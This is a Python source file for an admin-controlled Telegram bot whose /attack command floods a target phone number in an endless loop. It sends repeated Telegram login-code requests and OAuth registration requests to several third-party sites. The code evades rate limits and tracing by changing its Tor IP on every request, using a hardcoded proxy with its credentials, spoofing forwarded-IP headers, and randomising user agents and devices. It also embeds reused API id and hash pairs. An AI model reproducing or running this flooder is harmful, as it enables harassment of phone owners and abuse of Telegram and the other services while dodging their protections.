import os
import sys
import asyncio
import threading
import time
import random
import logging
import requests
import base64
import subprocess
import socket
import shutil
from urllib.parse import quote
from telethon import TelegramClient, errors
from telethon.sessions import MemorySession
from telegram.ext import Updater, CommandHandler
from telegram import ParseMode
from fake_useragent import UserAgent

# Логи
logging.basicConfig(level=logging.INFO)
logging.getLogger("telethon").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logging.getLogger("apscheduler.scheduler").setLevel(logging.WARNING)
logging.getLogger("apscheduler.executors").setLevel(logging.WARNING)

# ========== НАСТРОЙКИ ==========
USE_PROXY = True
USE_TOR = True
TOR_SOCKS_HOST = "127.0.0.1"
TOR_SOCKS_PORT = 8150
CHANGE_IP_EVERY_REQUEST = True
PROXY_TIMEOUT = 25
ENCRYPT_IP = True

MODE_ONLY_CODES = "codes"
MODE_ONLY_REG = "registration"
MODE_MIX = "mix"
CURRENT_MODE = MODE_MIX

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]

if not BOT_TOKEN or not ADMIN_IDS:
    print("❌ ОШИБКА: BOT_TOKEN или ADMIN_IDS не заданы!")
    sys.exit(1)

print(f"✅ Бот запущен! Администраторы: {ADMIN_IDS}")

# ========== TOR НА RAILWAY ==========
def find_tor_binary():
    """Railway ставит tor через apt в /usr/bin/tor"""
    for path in ["/usr/bin/tor", "/usr/sbin/tor"]:
        if os.path.exists(path):
            return path
    return shutil.which("tor")

def is_tor_process_running():
    try:
        result = subprocess.run("pgrep -x tor", shell=True, capture_output=True, text=True)
        return result.returncode == 0 and result.stdout.strip() != ""
    except Exception:
        return False

def kill_tor_processes():
    try:
        subprocess.run("pkill -x tor", shell=True, capture_output=True)
        time.sleep(2)
    except Exception:
        pass

def start_tor():
    """Запуск tor напрямую бинарником (в Railway нет systemd)"""
    tor_bin = find_tor_binary()
    if not tor_bin:
        print("❌ Бинарник tor не найден. Проверь Dockerfile.")
        return False

    # Если уже запущен — не дублируем
    if is_tor_process_running():
        print("✅ Tor уже запущен")
        return True

    # torrc уже создан в Dockerfile
    torrc = "/etc/tor/torrc"
    if not os.path.exists(torrc):
        print("⚠️ /etc/tor/torrc не найден, запускаю с параметрами")
        args = [
            tor_bin,
            "--SocksPort", f"{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}",
            "--ControlPort", "9051",
            "--CookieAuthentication", "0",
            "--DataDirectory", "/var/lib/tor",
        ]
    else:
        args = [tor_bin, "-f", torrc]

    print(f"🚀 Запуск Tor: {' '.join(args)}")
    try:
        log_file = open("/var/log/tor/stdout.log", "a")
        proc = subprocess.Popen(
            args,
            stdout=log_file,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
        print(f"✅ Tor запущен (PID: {proc.pid})")
        return True
    except Exception as e:
        print(f"❌ Ошибка запуска Tor: {e}")
        return False

def wait_for_tor_ready(timeout=90):
    print(f"⏳ Ожидание SOCKS5 на {TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TOR_SOCKS_HOST, TOR_SOCKS_PORT))
            s.close()
            print(f"✅ SOCKS5 порт {TOR_SOCKS_PORT} открыт")
            return True
        except Exception:
            time.sleep(2)
    print("❌ SOCKS5 порт не открылся")
    return False

def ensure_tor():
    print("\n" + "=" * 50)
    print("🧅 ИНИЦИАЛИЗАЦИЯ TOR (Railway)")
    print("=" * 50)

    tor_bin = find_tor_binary()
    if not tor_bin:
        print("❌ Tor не найден. Убедись что в Dockerfile есть apt-get install tor")
        return False

    print(f"✅ Tor: {tor_bin}")

    if not start_tor():
        return False

    if not wait_for_tor_ready(timeout=90):
        print("⚠️ Перезапуск Tor...")
        kill_tor_processes()
        time.sleep(2)
        start_tor()
        if not wait_for_tor_ready(timeout=60):
            print("❌ Tor не работает")
            return False

    if check_tor():
        print(f"🧅 Tor РАБОТАЕТ | IP: {get_current_tor_ip()}")
    else:
        print("⚠️ Tor запущен, но check.torproject.org не отвечает")

    return True

def renew_tor_ip():
    """Смена IP через control port 9051"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('127.0.0.1', 9051))
        s.send(b'AUTHENTICATE ""\r\n')
        s.send(b'SIGNAL NEWNYM\r\n')
        s.send(b'QUIT\r\n')
        s.close()
        time.sleep(3)
        print("🔄 Tor IP сменен (control port)")
        return True
    except Exception:
        pass

    try:
        result = subprocess.run(['pkill', '-HUP', 'tor'], capture_output=True)
        if result.returncode == 0:
            time.sleep(3)
            print("🔄 Tor IP сменен (HUP)")
            return True
    except Exception:
        pass

    kill_tor_processes()
    return start_tor()

def get_current_tor_ip():
    try:
        session = requests.Session()
        session.proxies = {
            'http': f'socks5h://{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}',
            'https': f'socks5h://{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}'
        }
        session.timeout = 10
        response = session.get('https://check.torproject.org/api/ip')
        if response.status_code == 200:
            return response.json().get('IP', 'Unknown')
    except Exception:
        pass
    return "Unknown"

def check_tor():
    try:
        session = requests.Session()
        session.proxies = {
            'http': f'socks5h://{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}',
            'https': f'socks5h://{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}'
        }
        session.timeout = 10
        response = session.get('https://check.torproject.org/')
        return response.status_code == 200
    except Exception:
        return False

# ========== ШИФРОВАНИЕ ==========
ENCRYPTION_KEY = "telegram_flooder_key_2024"

def encrypt_ip(data):
    if not ENCRYPT_IP:
        return data
    try:
        salt = str(random.randint(1000, 9999))
        timestamp = str(int(time.time() * 1000))[-8:]
        encrypted = base64.b64encode(f"{data}:{salt}:{timestamp}:{ENCRYPTION_KEY}".encode()).decode()
        prefix = ''.join(random.choices('abcdef0123456789', k=random.randint(6, 12)))
        suffix = ''.join(random.choices('abcdef0123456789', k=random.randint(6, 12)))
        return f"{prefix}{encrypted}{suffix}"
    except Exception:
        return data

def get_encrypted_headers(phone):
    headers = {
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.9', 'de-DE,de;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
    }
    if ENCRYPT_IP:
        headers['X-Encrypted-Data'] = encrypt_ip(phone)
        headers['X-Request-ID'] = encrypt_ip(str(time.time()))
        headers['X-Session-ID'] = encrypt_ip(str(random.randint(100000, 999999)))
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers['X-Forwarded-For'] = fake_ip
        headers['X-Real-IP'] = fake_ip
    return headers

# ========== USER-AGENT ==========
ua = UserAgent()

def get_dynamic_user_agent():
    agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(100,122)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(100,122)}.0.{random.randint(1000,5000)}.{random.randint(10,200)} Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(12,15)}_{random.randint(0,7)}) AppleWebKit/537.36 Chrome/{random.randint(100,122)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64; rv:{random.randint(90,120)}.0) Gecko/20100101 Firefox/{random.randint(90,120)}.0",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_{random.randint(0,5)} like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G{random.randint(900,999)}U) AppleWebKit/537.36 Chrome/{random.randint(100,122)}.0.0.0 Mobile Safari/537.36",
    ]
    if random.random() < 0.6:
        return random.choice(agents)
    try:
        return ua.random
    except Exception:
        return random.choice(agents)

# ========== OAuth URL ==========
OAUTH_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1528781664&origin=https://onlinesim.io&embed=1&request_access=write&return_to=https://onlinesim.io/auth/oauth/telegram',
]
oauth_stats = {}
oauth_index = 0
oauth_cycle = 0

# ========== API КЛЮЧИ ==========
BASE_API_IDS = [32158824, 611335, 37789433, 2040, 6, 2496, 17349]
BASE_API_HASHES = [
    "4f88b41f2e65643f5ca1c358d1eff02c",
    "d524b414d21f4d37f08684c1df41ac9c",
    "1cd392b7df0268da6ce7da489f6f67a7",
    "b18441a1ff607e10a989891a5462e627",
    "eb06d4abfb49dc3eeb1aeb98ae0f581e",
    "8da85b0d5bfe62527e5b244c209159c5",
    "344583e45741c457fe1862106095aeb5"
]

api_stats = {}

def generate_api():
    api_id = random.randint(100000, 99999999)
    api_hash = ''.join(random.choices('0123456789abcdef', k=32))
    api_stats[api_id] = {'success': 0, 'fail': 0, 'flood': 0}
    return (api_id, api_hash)

# ========== ПРОКСИ ==========
PROXY_POOL = [
    {'addr': '193.32.155.36', 'port': 9995, 'user': 'd5XyYU', 'pass': '8RJNeQ', 'name': 'RANDOM-1', 'fail': 0},
]

if USE_TOR:
    PROXY_POOL.append({
        'addr': TOR_SOCKS_HOST,
        'port': TOR_SOCKS_PORT,
        'user': '',
        'pass': '',
        'name': 'TOR',
        'fail': 0
    })

proxy_index = 0
last_tor_ip = None

def get_next_proxy():
    global proxy_index, last_tor_ip

    if USE_TOR and CHANGE_IP_EVERY_REQUEST:
        renew_tor_ip()
        time.sleep(2)
        current_ip = get_current_tor_ip()
        if current_ip != last_tor_ip:
            last_tor_ip = current_ip
            print(f"🔄 Новый Tor IP: {current_ip}")

    for _ in range(len(PROXY_POOL) * 2):
        proxy = PROXY_POOL[proxy_index % len(PROXY_POOL)]
        proxy_index += 1
        if proxy['fail'] < 3:
            return proxy

    for p in PROXY_POOL:
        p['fail'] = 0
    return PROXY_POOL[0]

# ========== OAuth ЗАПРОСЫ ==========
def send_oauth_request(phone):
    global oauth_cycle, oauth_index
    url = OAUTH_URLS[oauth_index % len(OAUTH_URLS)]
    oauth_index += 1
    proxy = get_next_proxy() if USE_PROXY else None

    session = None
    try:
        session = requests.Session()
        if USE_PROXY and proxy:
            if proxy['name'] == 'TOR':
                proxy_url = f"socks5h://{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}"
            elif proxy['user'] and proxy['pass']:
                proxy_url = f"socks5://{proxy['user']}:{quote(proxy['pass'])}@{proxy['addr']}:{proxy['port']}"
            else:
                proxy_url = f"socks5://{proxy['addr']}:{proxy['port']}"
            session.proxies = {'http': proxy_url, 'https': proxy_url}

        headers = get_encrypted_headers(phone)
        headers['User-Agent'] = get_dynamic_user_agent()

        response = session.post(url, data={'phone': phone}, headers=headers, timeout=PROXY_TIMEOUT)

        if response.status_code == 200:
            proxy['fail'] = 0
            oauth_cycle += 1
            return True
        else:
            proxy['fail'] += 1
            return False
    except Exception:
        if proxy:
            proxy['fail'] += 1
        return False
    finally:
        if session:
            session.close()

# ========== ОТПРАВКА КОДА ==========
flood_wait_active = False
flood_wait_until = 0

async def send_code(phone, api_id, api_hash, cycle_num):
    global flood_wait_active, flood_wait_until

    client = None
    proxy = get_next_proxy() if USE_PROXY else None

    while flood_wait_active and time.time() < flood_wait_until:
        remaining = int(flood_wait_until - time.time())
        if remaining > 0:
            print(f"[{cycle_num}] ⏳ Flood wait: {remaining} сек, меняем прокси...")
            if USE_PROXY:
                proxy = get_next_proxy()
                time.sleep(1)
            continue

    if flood_wait_active:
        flood_wait_active = False
        print(f"[{cycle_num}] ✅ Flood wait завершен!")

    try:
        telethon_proxy = None
        if USE_PROXY and proxy:
            if proxy['name'] == 'TOR':
                telethon_proxy = ('socks5', TOR_SOCKS_HOST, TOR_SOCKS_PORT)
                tor_ip = get_current_tor_ip()
                print(f"[{cycle_num}] 🧅 Tor IP: {tor_ip}")
            elif proxy['user'] and proxy['pass']:
                telethon_proxy = ('socks5', proxy['addr'], proxy['port'], True, proxy['user'], proxy['pass'])
            else:
                telethon_proxy = ('socks5', proxy['addr'], proxy['port'])

        client = TelegramClient(
            session=MemorySession(),
            api_id=api_id,
            api_hash=api_hash,
            device_model=random.choice(["Samsung S23", "iPhone 15 Pro", "Google Pixel 8"]),
            system_version=random.choice(["Android 14", "iOS 17.2"]),
            app_version=f"{random.randint(9,11)}.{random.randint(0,9)}",
            proxy=telethon_proxy,
            connection_retries=2,
            retry_delay=0.5,
            timeout=PROXY_TIMEOUT
        )

        await client.connect()

        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            print(f"[{cycle_num}] ✅ Код отправлен через {proxy['name'] if proxy else 'Без прокси'}")
            if proxy:
                proxy['fail'] = 0
            return True
        return True

    except errors.FloodWaitError as e:
        print(f"[{cycle_num}] 🌊 Flood wait {e.seconds} сек!")
        flood_wait_active = True
        flood_wait_until = time.time() + e.seconds
        if USE_TOR:
            renew_tor_ip()
            time.sleep(2)
        elif USE_PROXY and proxy:
            proxy['fail'] += 3
        return True

    except Exception as e:
        if proxy:
            proxy['fail'] += 1
        print(f"[{cycle_num}] ❌ Ошибка: {str(e)[:80]}")
        return True

    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

# ========== БЕСКОНЕЧНАЯ АТАКА ==========
attack_active = False
attack_phone = None
attack_cycle = 0
attack_thread = None
attack_start_time = None

def attack_loop():
    global attack_active, attack_cycle, oauth_cycle, flood_wait_active, flood_wait_until, attack_start_time

    attack_start_time = time.time()
    print(f"\n{'='*50}")
    print(f"🚀 АТАКА ЗАПУЩЕНА | {attack_phone}")
    print(f"🧅 Tor SOCKS5: {TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}")
    print(f"{'='*50}\n")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    while True:
        try:
            if not attack_active:
                break

            if flood_wait_active and time.time() < flood_wait_until:
                remaining = int(flood_wait_until - time.time())
                if remaining % 15 == 0:
                    print(f"⏳ Flood wait: {remaining} сек - меняем IP...")
                    if USE_TOR:
                        renew_tor_ip()
                    time.sleep(1)
                time.sleep(1)
                continue
            elif flood_wait_active:
                flood_wait_active = False
                print("✅ Flood wait завершен!")

            try:
                if CURRENT_MODE == MODE_ONLY_REG:
                    send_oauth_request(attack_phone)
                    time.sleep(random.uniform(0.2, 0.4))
                elif CURRENT_MODE == MODE_ONLY_CODES:
                    api_id = BASE_API_IDS[attack_cycle % len(BASE_API_IDS)]
                    api_hash = BASE_API_HASHES[attack_cycle % len(BASE_API_HASHES)]
                    loop.run_until_complete(send_code(attack_phone, api_id, api_hash, attack_cycle))
                    time.sleep(random.uniform(0.2, 0.4))
                else:
                    if attack_cycle % 3 == 0:
                        send_oauth_request(attack_phone)
                    else:
                        api_id = BASE_API_IDS[attack_cycle % len(BASE_API_IDS)]
                        api_hash = BASE_API_HASHES[attack_cycle % len(BASE_API_HASHES)]
                        loop.run_until_complete(send_code(attack_phone, api_id, api_hash, attack_cycle))
                    time.sleep(random.uniform(0.2, 0.4))

                attack_cycle += 1

                if attack_cycle % 100 == 0:
                    runtime = int(time.time() - attack_start_time)
                    tor_ip = get_current_tor_ip() if USE_TOR else "Tor выключен"
                    print(f"\n📊 Циклов: {attack_cycle} | Время: {runtime//60}:{runtime%60:02d}")
                    print(f"🌍 OAuth: {oauth_cycle} | Tor IP: {tor_ip}")

            except Exception as e:
                print(f"⚠️ Временная ошибка: {e}")
                if USE_TOR:
                    renew_tor_ip()
                    time.sleep(1)
                continue

        except KeyboardInterrupt:
            continue
        except Exception as e:
            print(f"❌ Критическая ошибка: {e}")
            time.sleep(1)
            continue

    print(f"\n🛑 АТАКА ОСТАНОВЛЕНА | Циклов: {attack_cycle}\n")

# ========== КОМАНДЫ БОТА ==========
def start(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return

    tor_status = "✅" if USE_TOR and check_tor() else "❌" if USE_TOR else "⚪"
    tor_ip = get_current_tor_ip() if USE_TOR and check_tor() else "-"

    update.message.reply_text(
        f"🤖 *Bot - Railway Edition*\n\n"
        f"🧅 Tor: {tor_status}\n"
        f"🧅 SOCKS5: `{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}`\n"
        f"🟢 IP: {tor_ip}\n\n"
        f"/attack +79991234567\n/stop\n/status\n/tor\n/tor change\n/proxy on|off",
        parse_mode=ParseMode.MARKDOWN
    )

def attack_command(update, context):
    global attack_active, attack_phone, attack_cycle, attack_thread, oauth_cycle, flood_wait_active, flood_wait_until

    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return
    if attack_active:
        update.message.reply_text("⚠️ Атака уже запущена!")
        return
    if not context.args:
        update.message.reply_text("❌ /attack +79991234567")
        return

    phone = context.args[0]
    if not phone.startswith('+') or not phone[1:].replace(' ', '').isdigit():
        update.message.reply_text("❌ Формат: +79991234567")
        return

    attack_active = True
    attack_phone = phone
    attack_cycle = 0
    oauth_cycle = 0
    flood_wait_active = False
    flood_wait_until = 0

    if USE_TOR:
        renew_tor_ip()
        time.sleep(2)
        tor_ip = get_current_tor_ip()
    else:
        tor_ip = "Tor не активен"

    update.message.reply_text(
        f"✅ Атака на {phone}\n🧅 Tor IP: {tor_ip}\n⏹️ /stop",
        parse_mode=ParseMode.MARKDOWN
    )

    attack_thread = threading.Thread(target=attack_loop)
    attack_thread.daemon = False
    attack_thread.start()

def stop_command(update, context):
    global attack_active
    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return
    attack_active = False
    update.message.reply_text("🛑 Атака остановлена.")

def status_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return

    if attack_active:
        runtime = int(time.time() - attack_start_time) if attack_start_time else 0
        tor_ip = get_current_tor_ip() if USE_TOR and check_tor() else "Tor не активен"
        flood_status = f"⏳ Flood wait: {int(flood_wait_until - time.time())} сек" if flood_wait_active and time.time() < flood_wait_until else "✅ Нет flood wait"
        update.message.reply_text(
            f"🟢 Атака активна\n📱 {attack_phone}\n🔄 Циклов: {attack_cycle}\n🌍 OAuth: {oauth_cycle}\n⏱️ {runtime//60}:{runtime%60:02d}\n🧅 {tor_ip}\n🌊 {flood_status}",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        update.message.reply_text("⚪ Атака не запущена.")

def tor_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return

    if context.args and context.args[0].lower() == "change":
        update.message.reply_text("🔄 Смена Tor IP...")
        renew_tor_ip()
        time.sleep(3)
        update.message.reply_text(f"✅ Новый IP: {get_current_tor_ip()}")
        return

    tor_running = check_tor() if USE_TOR else False
    tor_ip = get_current_tor_ip() if USE_TOR and tor_running else "-"
    tor_bin = find_tor_binary() or "не найден"
    proc_running = "✅" if is_tor_process_running() else "❌"

    if USE_TOR and tor_running:
        update.message.reply_text(
            f"🧅 Tor АКТИВЕН\n🌐 IP: {tor_ip}\n🧅 SOCKS5: `{TOR_SOCKS_HOST}:{TOR_SOCKS_PORT}`\n📁 {tor_bin}\n⚙️ Процесс: {proc_running}\n\n/tor change",
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        update.message.reply_text(f"⚠️ Tor не отвечает\n📁 {tor_bin}\n⚙️ {proc_running}\n\n🔄 Восстанавливаю...")
        ok = ensure_tor()
        if ok:
            update.message.reply_text(f"✅ Tor восстановлен! IP: {get_current_tor_ip()}")
        else:
            update.message.reply_text("❌ Не удалось. Проверь Dockerfile.")

def proxy_command(update, context):
    global USE_PROXY
    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return
    if not context.args:
        update.message.reply_text(f"🌐 Прокси: {'вкл' if USE_PROXY else 'выкл'}")
        return
    if context.args[0].lower() == "on":
        USE_PROXY = True
        update.message.reply_text("✅ Прокси ВКЛ")
    elif context.args[0].lower() == "off":
        USE_PROXY = False
        update.message.reply_text("✅ Прокси ВЫКЛ")
    else:
        update.message.reply_text("❌ /proxy on|off")

def mode_command(update, context):
    global CURRENT_MODE
    if update.effective_user.id not in ADMIN_IDS:
        update.message.reply_text("❌ Нет доступа.")
        return
    if not context.args:
        update.message.reply_text(f"Режим: {CURRENT_MODE}")
        return
    mode = context.args[0].lower()
    if mode == "codes":
        CURRENT_MODE = MODE_ONLY_CODES
        update.message.reply_text("✅ CODES")
    elif mode == "reg":
        CURRENT_MODE = MODE_ONLY_REG
        update.message.reply_text("✅ REG")
    elif mode == "mix":
        CURRENT_MODE = MODE_MIX
        update.message.reply_text("✅ MIX")
    else:
        update.message.reply_text("❌ /mode codes|reg|mix")

# ========== ЗАПУСК ==========
def main():
    print("\n" + "=" * 50)
    print("🤖 Bot - Railway Edition")
    print("=" * 50)

    if USE_TOR:
        ensure_tor()

    print("✅ Бот готов!\n")

    updater = Updater(token=BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("attack", attack_command))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("status", status_command))
    dp.add_handler(CommandHandler("tor", tor_command))
    dp.add_handler(CommandHandler("proxy", proxy_command))
    dp.add_handler(CommandHandler("mode", mode_command))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"❌ Ошибка: {e}")
